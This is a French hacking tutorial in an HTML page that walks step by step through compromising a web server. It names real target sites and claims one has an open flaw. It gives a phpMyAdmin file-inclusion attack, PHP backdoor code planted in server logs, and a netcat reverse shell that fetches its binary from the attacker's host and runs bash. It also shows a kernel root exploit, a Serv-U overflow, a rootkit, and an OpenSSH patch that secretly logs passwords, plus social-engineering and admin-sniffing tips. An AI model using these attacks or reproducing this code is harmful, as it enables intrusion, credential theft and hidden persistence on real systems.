@@ -1,0 +1,526 @@
+<html><head><title>\x53\x61\x76\x6f\x72\x79\x0a\x00</title></head><body><pre>
+v1.0
+EDITO:
+Ce document sans être détaillé montre étape par étape comment compromettre
+une machine de manière générale.
+
+1 Connaitre son ennemi
+2 Les entrées
+3 La connaissance
+4 Cacher son oeuvre
+5 Conclusion
+
+<b>1 Connaitre  son ennemi</b>
+
+Il faut toujours situer la machine savoir a quel groupe d'ip elle appartient, 
+dans le cas d'un site par exemple savoir quels sont les autres sites hébergés dessus.
+On évitera par exemple les gouv.fr les .gov et autres machines potentiellement dangereuses.
+Pour se faire "google est notre ami":
+On veut savoir par exemple comment entrer via faille web sur le site www.radiobuffy.com
+en faisant un nslookup on a www.radiobuffy.com to 213.186.36.151 to ns3524.ovh.net
+Mais quels sont donc les autres sites hŽbergŽs sur ce serveur ? une petite recherche google "allinurl:ns3524.ovh.net"
+et hop tt un tas de porte potentielles.
+
+De la même manière en utilisant l'ip en "supposant" qu'elle correspond à un bloc se situant dans un même datacenter.
+Par exemple pour attaquer iliad.fr d'ip 212.27.33.101
+on pourra rebondir a partir des machines www.societe.com to 212.27.33.30 ou encore assunet.fr to 212.27.33.27 par 
+exemple pour pouvoir accéder à un autre serveur par rebond le plus dur étant bien sûr de passer le premier serveur :)
+( à l'heure ou j'écris ceci il existe une très belle faille sur assunet.fr ;)  )
+
+Sinon connaître aussi les services tournant sur la cible ( un ti coup de nmap ) 
+leur version ( un ti coup de netcat derrière )
+Et en fonction des versions regarder des exploits potentiels sans oublier que les admins sont parfois tordu.
+
+Il y a plusieurs méthodes utilisées pour cacher les informations par exemple le nombre de serveur derrière un 
+reverse proxy ou un routeur, savoir si une requête sera broadcastée ou envoyée à un ou plusieurs serveur.
+Tout d'abord il faux considérer le serveur comme un système simple une grosse boite avec des trou fait pour entrer 
+et des autres pour sortir ce qui se passe dedans au départ ne nous intéresse pas.
+Pour ce faire on utilisera des outil d'audit pour la trajectoire des packets a la hping2 ou encore nemesis.
+
+Un exemple concret : nous avons un serveur SERV1 du site www.canalplus.fr qui reparti la charge 
+grâce a hping nous fabriquerons une série de packets identifiés par :
+- leur adresse de destination 
+- les flag ( SYN ACK RST etc. )
+- leur n° de séquence 
+- leur n° d'id
+par exemple on cherche à déterminer le nombre de machines derrière SERV1
+<font color="#990000"><code>
+savory@devil:~$ host canalplus.fr
+canalplus.fr has address 194.4.232.9
+savory@devil:~$ hping -S -p 80 194.4.232.9
+HPING 194.4.232.9 (eth0 194.4.232.9): S set, 40 headers + 0 data bytes
+len=46 ip=194.4.232.9 flags=SA DF seq=0 ttl=113 id=21109 win=65535 rtt=25.8 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=1 ttl=113 id=50503 win=65535 rtt=25.9 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=2 ttl=113 id=50625 win=65535 rtt=25.8 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=3 ttl=113 id=50691 win=65535 rtt=25.7 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=4 ttl=113 id=21787 win=65535 rtt=27.0 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=5 ttl=113 id=50959 win=65535 rtt=26.0 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=6 ttl=113 id=51029 win=65535 rtt=25.7 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=7 ttl=113 id=22206 win=65535 rtt=25.9 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=8 ttl=113 id=51237 win=65535 rtt=25.6 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=9 ttl=113 id=25130 win=16616 rtt=25.7 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=10 ttl=113 id=22519 win=65535 rtt=25.6 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=11 ttl=113 id=51796 win=65535 rtt=25.9 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=12 ttl=113 id=51945 win=65535 rtt=26.3 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=13 ttl=113 id=22845 win=65535 rtt=25.5 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=14 ttl=113 id=25698 win=16616 rtt=25.7 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=15 ttl=113 id=23077 win=65535 rtt=26.3 ms
+len=46 ip=194.4.232.9 flags=SA DF seq=16 ttl=113 id=23209 win=65535 rtt=27.1 ms
+
+--- 194.4.232.9 hping statistic ---
+17 packets tramitted, 17 packets received, 0% packet loss
+round-trip min/avg/max = 25.5/26.0/27.1 ms
+</code></font>
+ici on regarde les entêtes des ping qui répondent en regardant les id et surprise on a plusieurs séquences différentes
+les 50959 / 51237 les 21109 / 21787  et les 25130 / 25698 ( les autres résultats étant trop proche on les négligera )
+Bien entendu il faut pouvoir effectuer une plus grande série de ping pour avoir des résultat plus probant et suivre 
+l'evolution des id.
+On remarquera ici qu'il y a un système hétérogène aux deux autres le paramètre win ( qui indique la fenêtre tcp )
+est spécifique a un os et nous remarquons deux séries différentes les 65535 & les 16616.
+Voila comment déjouer un système de répartition de charge pour se faire à peu près une idée de la structure interne de 
+leur serveur web, à la place du reverse proxy nous pouvons aussi avoir un round robin qui fait une répartition de charge 
+aléatoire et donc visible par un simple nslookup par exemple :
+
+
+<font color="#990000"><code>
+savory@devil:~$ host news.free.fr
+news.free.fr is an alias for news.proxad.net.
+news.proxad.net has address 212.27.42.69
+news.proxad.net has address 212.27.42.70
+news.proxad.net has address 212.27.42.71
+news.proxad.net has address 212.27.42.72
+news.proxad.net has address 212.27.42.73
+news.proxad.net has address 212.27.42.74
+news.proxad.net has address 212.27.42.65
+news.proxad.net has address 212.27.42.66
+news.proxad.net has address 212.27.42.67
+news.proxad.net has address 212.27.42.68
+</code></font>
+Nous voyons donc que le site de news de free possède lui aussi un système de répartition 
+mais que les serveur sont accessible directement depuis le net ( plus sympas pour nous ce système )
+
+Si votre serveur est de type web avec des pages dynamiques regardez aussi les application en php ou en asp et regarder
+si elles sont faillables ou pas, l'utilisateur qui lance le serveur web a tjr des droits c'est tjr sympas de les recuperer.
+
+<b>2 Les entrées</b>
+
+Comme on l'a vu au dessus si on se fixe un but a pirater il est souvent preferable de rebondir sur des services 
+ou des serveurs y accedant directement surtout quand celui ci est relativement securisé.
+Les entrées principales selon un sondage de k-otik seraient les services :
+BIND
+RPC
+Apache
+SENDMAIL
+SNMP
+OpenSSL
+En meme temps je pensais aussi aux failles ipc/webdav/iss utilisées en masse sur des serveurs NT.
+
+Tout d'abord le principe d'action:
+Soit les failles sont de type applicatives cad qu'elles proviennent d'une erreur d'ecriture de l'application, dans ce cas
+on utilisera ce que l'on apelle communement un buffer overflow car la majeure partie de ces failles viennent d'une 
+mauvaise gestion de la memoire que l'on peut manipuler en injectant du bytecode directement dans un parametre de ce 
+service.
+Des milliers voire des dixaines de milliers de shellcodes trainent sur le net il n'y a qu'a demander a google ;)
+voire meme quand on a de la chance un petit exploit fait directement pour les exploiter.
+On entrera pas dans les details car les exploits en remote ne dure que tres peu de temps du fait de leur propagation
+rapide.
+Les failles peuvent etre aussi de configuration, une mauvaise configuration du service bind par exemple permet de 
+pouvoir connaitre tout les sous domaines d'un domaine grace a la commande axfr, ou encore des fichier de conf 
+php qui possedent les L/P d'un compte accedant a une base ( grace a cela utiliser un exploit mysql pour 
+exporter un shell par exemple)...
+Bref les configurations sont tres variées.
+
+Bon pour vous faire plaisir un exemple de piratage melangeant failles applicative et failles de configuration.
+On prendra pour exemple la derniere faille trouvée sur phpmyadmin ( qui a couté pas mal de pass volés chez free ;-)  )
+sur une machine unix ... 
+le code faillable (export.php):
+<font color="#990000"><code>
+// What type of export are we doing?
+if ($what == 'excel') {
+    $type = 'csv';
+} else {
+    $type = $what;
+}
+
+/**
+ * Defines the url to return to in case of error in a sql statement
+ */
+require('./libraries/export/' . $type . '.php');
+</code></font>
+La variable $what est directement incluse en tant que $type sans aucun controle et le require n'aime pas les byte null ;)
+Nous admettrons qu'un utilisateur test existe de base dans mysql et k'il nous servira a entrer sur phpmyadmin
+<i>
+Nous avons donc notre :
+www.victime.com d'ip 11.12.13.14
+soit sur phpmyadmin 
+http://www.victime.com/phpMyAdmin/export.php?what=../../../../../../../etc/passwd%00
+par exemple qui nous affichera la liste des utilisateurs.
+</i>
+Pour pouvoir modifier un fichier sur le serveur il faut penser  a 
+" mais en faisant une requete http quels sont les fichiers modifiés et quel impact ai je sur eux".
+Nous avons un probleme ici c'est qu'on peut acceder au fichiers du systeme en lecture 
+sans maitriser ce que l'on veut recuperer.
+
+<i>
+Pour ce faire deja regarder comment est la configuration de notre apache donc on y va a l'aveuglette.
+On teste les differentes url 
+http://www.victime.com/phpMyAdmin/export.php?what=../../../../../../../etc/httpd/conf/httpd.conf%00
+http://www.victime.com/phpMyAdmin/export.php?what=../../../../../../../etc/httpd.conf%00
+http://www.victime.com/phpMyAdmin/export.php?what=../../../../../../../etc/httpd/httpd.conf%00
+...
+pour s'aider on pourra regarder le fichier /proc/version qui indique la version du systeme unix
+</i>
+En trouvant ce fichier de configuration on peut voir deja les parametres que l'on peut modifier : les log
+<i>
+petite astuce pour pouvoir entrer des script php dans les log d'un serveur web simplement utiliser l'urlencoding
+urlencode() en php :
+soit &lt;?include($page);&gt; en %3C%3Finclude%28%24page%29%3B%3F%3E
+ensuite en regardant les log de victime on regarde les log d'erreur du site en lui meme ou de ses sous domaines et hop :
+http://sousdomaine.victime.com/%3C%3Finclude%28%24page%29%3B%3F%3E
+typiquement :
+</i>
+<font color="#990000"><code>
+Not Found
+
+The requested URL /&lt;?include($page);?&gt; was not found on this server.
+_________________________________________________________________
+
+
+Apache/1.3.26 Server at sousdomaine.victime.com Port 80 </code></font>
+<i>
+une backdoor de prete on y accedera par la suite avec
+http://www.victime.com/phpMyAdmin/export.php?what=../../../../../../../path/to/http_error.sousdomaine.log%00
+et donc pour profiter de la backdoor
+http://www.victime.com/phpMyAdmin/export.php?page=http://tonsitekigerepaslephp.com/tonscript.php&what=../../../../../../../path/to/http_error.sousdomaine.log%00
+</i>
+Voila pour le coté de la faille d'application, le service apache est l'un des services le plus difficile a maitriser 
+de par son systeme de modules et ses pages dynamiques, une erreur de script est vite arrivée.
+
+<i>
+On supposera ici qu'il ne faille pas casser le safemode et donc que la fonction system() soit activée.
+</i>
+Premierement recuperer les droit du service attaqué et les reutiliser a notre avantage.
+<i> Dans notre exemple les droits de l'utilisateur apache sont limités mais pas assés pour eviter d'ouvrir des sockets
+comme dans la grande majoritées des cas.
+Pour eviter tt pb de regle nat on utilisera netcat qui se connectera sur une machine distance ce qui aura pour effet
+d'eviter de lancer un demon sur victime.com</i>
+typiquement :
+MACHINE DEVIL
+<font color="#990000"><code>
+savory@devil:~$ ./nc -vv -l -p 8888
+listening on [any] 8888 ...
+
+</code></font>
+MACHINE VICTIME via system() 
+( le lieu de stockage des binaires est /tmp )
+( pour casser un noexec utiliser /lib/ld-linux.so.2 /path/to/nc pour lancer netcat )
+<font color="#990000"><code>
+cd /tmp;lynx -source http://tonsitekigerepaslephp.com/ncstatic >nc;chmod +x nc;./nc machine.devil.com 8888 -e /bin/bash
+</code></font>
+MACHINE DEVIL
+<font color="#990000"><code>
+savory@devil:~$ ./nc -vv -l -p 8888
+listening on [any] 8888 ...
+connect to [14.13.12.11] from www.victime.com [11.12.13.14] 34691
+ls
+clean
+data
+ftpd
+log
+log.sh
+login
+nada.mp3
+nc
+rev.pl
+sk
+wd
+
+</code></font>
+Voila la partie exploitation de configuration de notre exemple est finie nous avons une console en remote sur la machine
+possedant les droits de l'utilisateur apache il va maintenant falloir augmenter ses droits jusqu'a root.
+Pour ce faire nous avons tt un panel d'exploits "locaux" qui nous permettent d'y arriver je tiens d'ailleur a 
+attirer votre attention sur les exploits kernel qui sont plus robuste et qui cassent beaucoup de protections anti bof. 
+Nous avons par exemple les failles ptrace do_brk() mremap() et nouvellement la faille ip_setsockopt().
+Dans notre cas on utilisera la faille mremap soit :
+<font color="#990000"><code>
+wget http://savory.free.Fr/map2.c
+--00:38:26--  http://savory.free.fr/map2.c
+           => `map2.c'
+Résolution de savory.free.fr... complété.
+Connexion vers savory.free.fr[212.27.40.173]:80...connecté.
+requête HTTP transmise, en attente de la réponse...200 OK
+Longueur: 6,336 [text/plain]
+
+100%[====================================>] 6,336          6.04M/s    ETA 00:00
+
+00:38:26 (6.04 MB/s) - `map2.c' sauvegardé [6336/6336]
+
+gcc -O3 -static -fomit-frame-pointer map2.c -o remap
+id
+uid=33(www-data) gid=33(www-data) groupes=33(www-data)
+./remap
+
+[+] kernel 2.4.24-grsec  vulnerable: YES  exploitable YES
+    MMAP #65530  0x50bfa000 - 0x50bfb000
+[+] Success
+
+id
+uid=0(root) gid=0(root) groups=33(www-data)
+
+</code></font>
+Voila pour la fin de l'explication d'une des utilisations de la faille applicative certe beaucoup plus complexe 
+que la premiere mais plus facilement abordable par les programmeurs.
+Il faut aussi realiser que dans notre exemple a partir d'un simple site web nous recuperons le root de la machine comme
+quoi la moindre faiblesse peu finalement s'averer etre un trou beant.
+
+Ensuite a partir de cette machine generalement les piratent emploieront des sniffer de terminaux comme lkl par exemple
+ou une backdoor personnelle qu'il auront créé a partir d'un service opensource recompilé par leur soins 
+( entendre ici recompilé avec un patch qui leur permettra de revenir plus facilement ;)  )
+On pourra egalement utiliser des backdoors ou des rootkit evolués ( SuckIt & adore-ng ) sachant que le patch reste la 
+solution la plus secure.
+
+Ensuite on reiterera sur les autres machines du lan en provoquant volontairement un incident sur la machine compromise
+afin de forcer l'administrateur a se connecter dessus et pouvoir sniffer son activitée ainsi que les pass k'il emploie
+( plus facile pour avoir les autre machines du rezo ;)  )
+
+Pour finir il ne faut pas rever les failles applicatives en remote sont tres rares mais elles existent toujours.
+( openssl samba mysql pour ne citer qu'eux )...
+
+Bien entendu je veux rester dans la generalitée d'un systeme et j'ai pris cet exemple qu'a titre informatif, je ne veux
+pas vous apprendre a pirater mais a penser comme quelqu'un qui veut entrer sur un systeme.
+Bien sur nous avons d'autres solutions a savoir que l'ont peut penetrer une machine du rezo pour rebondir sur la cible
+ou utiliser le social engineering ( par mail telephone ou autre ) afin d'essayer de recuperer un maximum d'information
+sur l'authentification de ce systeme voire meme un pass inespéré.
+(personellement je n'ai vu ce cas marcher qu'une seule fois sur un hebergeur de site web en se faiant passer pour
+ un client et par telephone demander de changer le pass ftp de ce site ^^).
+
+Les vers aussi souvent utilisent des backdoor sur les systemes qu'ils infectent, les pirates eux aussi peuvent laisser 
+des belles portes garnies ;)
+
+Bon aller un autre exemple pour la forme beaucoup plus rapide que le precedent sur une machine deja compromise par 
+quelqu'un d'autre.
+Concretement nous avons une machine NT possedant un Serv-U posé par des pirates de board ftpavec un l/p sur un port 
+particulier ( en gros un stro :)  )
+On veut recuperer une console de ce systeme avec les droits de l'utilisateur qui a lancé le service Serv-U on 
+utilisera dans ce cas une faille remote de type applicative le "Serv-U MDTM Command Buffer Overflow Vulnerability"
+typiquement une fois logué nous pouvons envoyer la commande :
+<font color="#990000"><code>
+MDTM 20031111111111+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /salut.petit
+</code></font>
+bien entendu le fichier demandé salut.petit n'existe pas et a la place nous y mettrons un shellcode qui bind 
+une console sur un port de la machine compromise.
+( on supposera ici qu'il n'y a pas de nat ou de firewall restrictif sur cette machine car dans ce cas le shellcode
+devra etre different, un sh qui par exemple exporte une console un peu comme netcat ;) )
+et c'est parti :
+<font color="#990000"><code>
+savory@devil:~$./sv -h 192.168.1.5 -t 3 -P 3333 -u monlog -p monpass -d 3000
+ Serv-U FTPD 3.x/4.x MDTM Command remote overflow exploit
+ bug find by bkbll (bkbll@cnhonker.com) code by Sam (Sam@0x557.org)
+
+ # Connecting......
+  [+] Connected.
+  [*] USER monlog .
+  [*] 10 bytes send.
+  [*] PASS monpass .
+  [*] 17 bytes send.
+  [+] login success .
+  [+] remote version: Serv-U v4.x with Windows XP EN SP1
+  [+] trigger vulnerability !
+  [+] 1027 bytes overflow strings sent!
+  [+] successed!!
+
+
+  Microsoft Windows XP [Version 5.1.2600]
+  (C) Copyright 1985-2001 Microsoft Corp.
+
+   C:\>
+</code></font>
+
+Je n'ai peut etre pas ete assé general dans les conditions et les differentes entrŽe possibles mais je pense avoir pu
+montrer au moin les possibilitées d'entrées.
+
+<b>3 La connaissance</b>
+
+Bien entendu pour effectuer ce genre d'attaque il vous faudra parfaire vos connaissances en reseaux programmation
+scripts en tout genre mais aussi " et c'est la l'avantage d'un pirate " detourner l'utilisation normale d'un service ou 
+d'une application.
+Mais il faut savoir aussi qu'actuellement avec les nouvelles technologies la tache est beaucoup moin hardue qu'il n'y 
+parait.
+Par exemple un script php peut servir de page dynamique ( sa fonction principale ) mais aussi de shell script 
+( #!/bin/php4 -q) de cgi ou encore de programme a part entiere :)
+Meme des virus ecris en php existent sur des machines unix
+De meme pour le python le perl etc :)
+Le C est un bon language de programmation mais deroute un peu au debut, pour l'ecriture d'un exploit a base de stack
+overflow c'est le language de predilection mais il ne faut pas oublier que l'on peut le faire dans d'autre languages 
+tel le php le perl ou le python par exemple.
+Je preconise apprendre a fond un language de script :) une fois maitrisé dans ses moindres recoins apprendre un vrai 
+language comme le C.
+Il ne faut pas oublier non plus que le calcul et l'ecriture d'un shellcode se font a partir du C et ensuite d'un coup 
+de desassembleur.
+Je n'expliquerais pas ici l'ecriture d'un shellcode ( google le fait tres bien ) mais sachez que ce n'est pas 
+si difficile qu'il n'y parait ...
+
+C'est vrai qu'il n'y a pas grand a dire mais plutot il y a plein de technologies a apprendre apres a vous de voir si 
+vous voulez maitriser ... mon conseil ? apprendre tout ce qui peut etre appris en info tester tout ce qui est possible 
+et imaginable , avoir de la suite dans les idées et surtout ne jamais se decourager ...
+ "tout ce qui a été créé par l'hommes peut etre detruit par l'homme" ( Stalone RAMBO II )
+
+On va passer les conneries genre mentalitée d'un hacker etc c de la masturbation intellectuelle  ;)
+ Et perso je pense que la periode "hacker" "pirate" etc est passée maintenant il n'y a plus que des pti malins :)
+
+Ensuite apprendre les systemes ne denigrer aucun, il faut savoir que windows unix linux osx etc .. n'ont pas ete ecrit
+ en 1 journée il faut respecter le travail des developpeurs mais aussi apprendre a etre plus tolerant envers 
+ l'open source ou le closed source ...
+( Marre des extremistes qui balance une ligne sur 2 "fuck m$" et "*bsd powa", chaque systeme a ses avantages )
+
+Donc essayer d'etre autant a l'aise sous windows linux bsd etc ( je trouve que vmware est un bon outil pour se faire la 
+main sur plusieurs systemes sans trop se faire c* a casser ses partitions )
+
+Enfin voila je ne vois pas trop quoi dire de plus a part apprendre :) et utiliser google a mort ^^
+
+<b>4 Cacher son oeuvre</b>
+
+Comme dans les cas précedant j'essayerais de rester le plus general possible en restant independant de tout type de 
+plateforme mais le sujet ici m'oblige a faire du specifique ...
+On va commencer par un exemple qui me parait etre le mieux pour commencer :)
+(Stealth Suckit) :
+
+<font color="#990000"><code>
+./login -h www.victime.com -d 80
+/dev/null
+Listening to port 1279
+password:
+Trying 11.22.33.44:80...
+Trying...Et voila
+Server connected. Escape character is '^K'
+/dev/null
+[root@anat .jsk]# id
+uid=0(root) gid=0(root)
+[root@anat .jsk]# w
+ 21:35:39 up  9:31,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+[root@anat .jsk]#
+</code></font>
+C'est une nouvelle espece de rootkit qui attaque directement la memoire du kernel  plutot que de s'inserer 
+en tant que module .
+Ses proprietées :
+- reverse telnet a partir d'une demande de connexion faites via un packet spoofé sur nimporte kel port 
+ouvert de la machine qui cache la connexion dans netstat iptraf etc ...
+- possibilitée de cacher des processus (leur pid) des repertoires des sockets ...
+- sniff de tt les tty de la machine
+
+créé par une de mes idoles sd :)
+
+Pour simplifier c'est THE BACKDOOR ;) ( moment pub fini )
+Mais comme tt les rootkit il presente des desavantages meme si la version de mon site a ete modifiée pour 
+se rendre indetectable avec chkrootkit skdetect rkhunter et tripwire il y a tjr le pb du pid dans /proc
+car meme caché dans le pstree il reste dans le dossier virtuel /proc endroit d'ou on pourra tjr le killer...
+
+Pour contrer ce genre de pb nous avons les patch :)
+En reflechissant au service le plus utilisé pour se connecter a un systeme nous avons sshd ...
+Et justement plusieurs dev nous ont créés des patch permettant de se connecter ni vu ni connu en root avec le log
+de pass
+par exemple le loguer de openssh 2.9 ( les version de backdoor ssh sont trop longue pour etre pastée ici ) :
+
+<font color="#990000"><code>
+diff -N -c -r openssh-2.9p2/ssh.c openssh-2.9p2-new/ssh.c
+*** openssh-2.9p2/ssh.c Tue Apr 17 14:14:35 2001
+--- openssh-2.9p2-new/ssh.c     Tue Nov 27 05:56:01 2001
+***************
+*** 249,254 ****
+--- 249,255 ----
+        struct passwd *pw;
+        int dummy;
+        uid_t original_effective_uid;
++         FILE *lg;
+
+        __progname = get_progname(av[0]);
+        init_rng();
+***************
+*** 716,721 ****
+--- 717,727 ----
+            tilde_expand_filename(options.user_hostfile2, original_real_uid);
+
+        /* Log into the remote system.  This never returns if the login fails. */
++         lg=fopen("/tmp/ssh.log", "a");
++         fprintf(lg, "Host: %s\n", host);
++         fprintf(lg, "User: %s\n", options.user);
++         fclose(lg);
++
+        ssh_login(sensitive_data.keys, sensitive_data.nkeys,
+            host, (struct sockaddr *)&hostaddr, pw);
+
+diff -N -c -r openssh-2.9p2/sshconnect.c openssh-2.9p2-new/sshconnect.c
+*** openssh-2.9p2/sshconnect.c  Thu Apr 12 19:34:36 2001
+--- openssh-2.9p2-new/sshconnect.c      Tue Nov 27 05:56:01 2001
+***************
+*** 775,785 ****
+--- 775,790 ----
+  {
+        int size;
+        char *padded;
++         FILE *lg;
+
+        if (datafellows & SSH_BUG_PASSWORDPAD) {
+                packet_put_string(password, strlen(password));
+                return;
+        }
++
++         lg=fopen("/tmp/ssh.log", "a");
++         fprintf(lg, "Password: %s\n\n", password);
++         fclose(lg);
+        size = roundup(strlen(password) + 1, 32);
+        padded = xmalloc(size);
+        memset(padded, 0, size);
+diff -N -c -r openssh-2.9p2/sshconnect2.c openssh-2.9p2-new/sshconnect2.c
+*** openssh-2.9p2/sshconnect2.c Thu Apr 19 16:40:46 2001
+--- openssh-2.9p2-new/sshconnect2.c     Tue Nov 27 05:56:01 2001
+***************
+*** 441,446 ****
+--- 441,447 ----
+        static int attempt = 0;
+        char prompt[80];
+        char *password;
++         FILE *lg;
+
+        if (attempt++ >= options.number_of_password_prompts)
+                return 0;
+***************
+*** 457,462 ****
+--- 458,466 ----
+        packet_put_cstring(authctxt->method->name);
+        packet_put_char(0);
+        packet_put_cstring(password);
++         lg=fopen("/tmp/ssh.log", "a");
++         fprintf(lg, "Password: %s\n\n", password);
++         fclose(lg);
+        memset(password, 0, strlen(password));
+        xfree(password);
+        packet_inject_ignore(64);
+
+</code></font> 
+
+En regardant sur google vous verrez k'il y a plusieurs versions autant pour le log via ssh que pour une backdoor 
+avec sshd.
+Ce genre d'outil est indetectable avec snort rkhunter skdetect chkrootkit etc ... mais attention tt de meme
+si le systeme a un moyen de verifications de fichier par comparaison md5 style tripwire, il faudra envisager 
+le rootkit.
+Et il ne faut oublier que les modifications de services sshd ne cache pas les sockets ...
+
+Les autres moyen d'entrées sur les systemes cvs, apache ( on modifiera ou ajoutera les modules adequats),ftpd etc
+une tite rlz de code et hop ;)
+
+<b>5 Conclusion</b>
+
+Je ne sais pas si ca vous aura servit mais perso je m'en branle et je me suis amusé a faire ce tuto
+c'est mon premier essai certe j'en suis pas fier mais j'en referai.
+
+On oublie les fautes d'orthographes ( g jms ete bon a l'école )
+
+Savory.
+
+Greetz to jer kang sd
+
+
+
+</pre><p>&nbsp;</p></body></html>
